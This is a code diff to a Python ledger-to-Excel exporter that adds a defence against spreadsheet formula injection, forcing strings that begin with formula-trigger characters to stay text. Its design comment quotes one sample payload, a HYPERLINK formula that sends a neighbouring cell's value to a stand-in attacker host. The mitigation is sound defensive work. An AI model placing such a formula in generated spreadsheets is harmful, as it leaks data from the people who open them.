@@ -23,6 +23,23 @@ column up:
 
     A FIGURE NOBODY HOLDS IS AN EMPTY CELL, NOT A ZERO. `None` writes nothing.
 
+    TEXT IS TEXT, NEVER A FORMULA SOMEBODY ELSE WROTE. openpyxl turns any
+    string that begins with "=" into a live formula, and a ledger's narration
+    and reference come from bank statements and from the counterparty ("UPI
+    remark"), so `=HYPERLINK("http://evil.example/?x="&A1,"click")` arrived in
+    the Particulars column as a clickable cell that leaks its neighbour. The
+    workbook is handed to a bank or an auditor who opens it in Excel. A string
+    beginning with `=`, `+`, `-`, `@`, a tab or a carriage return (the
+    characters OWASP names, and the last two are ones Excel strips before it
+    decides) is written as a STRING cell with Excel's own quote-prefix flag, so
+    it also stays text when somebody presses F2 and Enter on it, and the value
+    itself is left exactly as it was received: no apostrophe is spliced into
+    the text. It is done ONCE, over every cell of every sheet at the point of
+    saving (`_keep_text_as_text`), and not at each place a string is written,
+    because the Details sheet carries the firm's name, the client's name and
+    the caveats, which people typed, and a fifth writer added later would
+    otherwise have to remember it.
+
     THE HEADER ROW FREEZES AND THE COLUMNS ARE WIDE ENOUGH. A ledger whose
     particulars are clipped to eight characters is not a ledger.
 
@@ -75,6 +92,31 @@ def _hex(token: str) -> str:
 
 def _label(col) -> str:
     return f"{col.label} (Dr +, Cr -)" if col.kind == BALANCE else col.label
+
+
+#: The first characters that make a spreadsheet read a string as a formula. A
+#: tab or a carriage return is stripped by Excel before it decides, so a string
+#: that starts with one and then `=` is a formula all the same.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _keep_text_as_text(wb: Workbook) -> None:
+    """Make every string that could be read as a formula a TEXT cell.
+
+    Only strings are touched. A number is a `Decimal` or an `int` and never
+    starts with anything, so a negative balance stays a number `=SUM()` can add;
+    and a string that does not begin with a trigger gains nothing at all, so
+    ordinary narration is byte for byte what it was.
+    """
+    for ws in wb.worksheets:
+        for row in ws.iter_rows():
+            for cell in row:
+                value = cell.value
+                if isinstance(value, str) and value.startswith(_FORMULA_TRIGGERS):
+                    # `data_type` first: assigning the value had already chosen
+                    # "f" for a string beginning "=", and the writer goes by it.
+                    cell.data_type = "s"
+                    cell.quotePrefix = True
 
 
 def _unique_sheet(wb: Workbook, wanted: str) -> str:
@@ -178,6 +220,7 @@ def build_report_xlsx(doc: ReportDocument, *, holder: dict, firm: dict,
         for cell in row:
             cell.alignment = Alignment(wrap_text=True, vertical="top")
 
+    _keep_text_as_text(wb)
     out = io.BytesIO()
     wb.save(out)
     return out.getvalue()
